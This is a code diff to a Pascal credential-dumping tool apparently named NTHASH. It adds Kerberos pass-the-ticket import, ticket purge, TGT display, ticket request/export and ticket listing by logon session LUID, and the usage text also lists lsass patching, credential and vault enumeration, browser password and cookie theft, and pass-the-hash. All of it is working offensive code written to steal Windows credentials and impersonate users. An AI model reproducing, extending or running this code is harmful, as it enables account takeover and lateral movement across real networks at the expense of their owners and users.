@@ -257,12 +257,12 @@ end;
 
 
 var
-  lsass_pid:dword=0;
+  //lsass_pid:dword=0;
   _long:longint;
   p,ret,dw,dw1,dw2:dword;
   n:nativeint;
   consolecp:uint;
-  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input,mode,key:string;
+  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input,mode,key,luid:string;
   inputw:widestring;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
@@ -1235,6 +1235,12 @@ begin
   log('NTHASH /enumcred2',1); //will patch lsass
   log('NTHASH /enumvault',1);
   //***************************************************
+  log('NTHASH /ptt /binary:filename [/luid:luid]',1); //import
+  log('NTHASH /purge [/luid:luid]',1);
+  log('NTHASH /ask /input:servicename [/luid:luid]',1); //export
+  log('NTHASH /tgt [/luid:luid]',1); //similar to export but will only display a ticket...
+  log('NTHASH /klist [/luid:luid]',1); //no luid
+  //***************************************************
   log('NTHASH /chrome [/binary:path_to_database] [/input:hexastring]',1);
   log('NTHASH /ccookies [/binary:path_to_database]',1);
   log('NTHASH /firefox [/binary:path_to_database]',1);
@@ -1438,6 +1444,13 @@ begin
        //delete(input,pos(' ',input),2048);
        delete(input,pos(' /',input),2048);
        input:=trim(input);
+       end;
+  p:=pos('/luid:',cmdline);
+  if p>0 then
+       begin
+       luid:=copy(cmdline,p,255);
+       luid:=stringreplace(luid,'/luid:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(luid,pos(' ',luid),255);
        end;
   p:=pos('/mode:',cmdline);
   if p>0 then
@@ -2045,6 +2058,76 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
           then log('Done',1)
           else log('Failed',1);
        end;
+  p:=pos('/ptt',cmdline);
+  if p>0 then
+   begin
+   if luid='' then luid:='0';
+   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
+   inhandle:=thandle(-1);
+   inhandle := CreateFile(pchar(binary), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+   dw := GetFileSize(inhandle,nil)  ;
+   pb:=allocmem(dw);ret:=0;
+   if inhandle<>thandle(-1) then ReadFile(inhandle,pb^,dw,ret,nil);
+   if inhandle<>thandle(-1) then closehandle(inhandle);
+   if ret<>0 then
+     begin
+     if kuhl_m_kerberos_init=0 then
+        begin
+        kuhl_m_kerberos_use_ticket(pb,ret,strtoint(luid));
+        kuhl_m_kerberos_clean ;
+        end;
+     end;
+   goto fin;
+   end;
+  p:=pos('/purge',cmdline);
+  if p>0 then
+   begin
+   if luid='' then luid:='0';
+   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
+   if kuhl_m_kerberos_init=0 then
+      begin
+      kuhl_m_kerberos_purge_ticket(strtoint(luid)) ;
+      kuhl_m_kerberos_clean ;
+      end;
+   goto fin;
+   end;
+  p:=pos('/tgt',cmdline);
+  if p>0 then
+   begin
+   if luid='' then luid:='0';
+   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
+   if kuhl_m_kerberos_init=0 then
+      begin
+      kuhl_m_kerberos_tgt(strtoint(luid)) ; //a different luid will lead to SEC_E_NO_CREDENTIALS
+      kuhl_m_kerberos_clean ;
+      end;
+   goto fin;
+   end;
+  p:=pos('/ask',cmdline);
+  if p>0 then
+   begin
+   if luid='' then luid:='0';
+   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
+   if kuhl_m_kerberos_init=0 then
+      begin
+      kuhl_m_kerberos_ask(input,true,strtoint(luid)) ;
+      kuhl_m_kerberos_clean ;
+      end;
+   goto fin;
+   end;
+  p:=pos('/klist',cmdline);
+  if p>0 then
+   begin
+   if luid='' then luid:='0';
+   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
+   if kuhl_m_kerberos_init=0 then
+      begin
+      kuhl_m_kerberos_list(strtoint(luid)) ;
+      //GetActiveUserNames(@callback_enumlogonsession);
+      kuhl_m_kerberos_clean ;
+      end;
+   goto fin;
+   end;
   //***************** RUN *****************************
   p:=pos('/pth',cmdline);
   if p>0 then
@@ -2054,6 +2137,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
       else pth(user,password,domain);
    goto fin;
    end;
+
 
   p:=pos('/runastoken',cmdline);
   if p>0 then
